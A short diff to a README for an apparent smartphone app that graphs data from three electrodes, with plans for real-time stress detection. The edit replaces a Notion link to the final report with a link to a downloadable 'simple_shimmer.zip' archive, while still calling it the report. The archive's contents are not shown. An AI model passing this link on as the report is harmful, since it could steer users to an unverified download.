@@ -6,4 +6,5 @@ Right now, the app can read some CSV files from a MATLAB model (created by Rober
 graphs of the three electrodes along with a table view of the data points of the three electrodes. 
 Future plans to this projects features a Bluetooth or equivalent connection to the smartphone application in order to control
 the streaming of the device and as well as enabling a real-time stress detection on the smartphone application. 
-For more details on the application, here's a link to the report (https://www.notion.so/kassymart/Final-Report-109c68086243802e80c8e6c6205b13f6?pvs=4)
+For more details on the application, here's a link to the report
+([simple_shimmer.zip](https://github.com/user-attachments/files/17167820/simple_shimmer.zip))
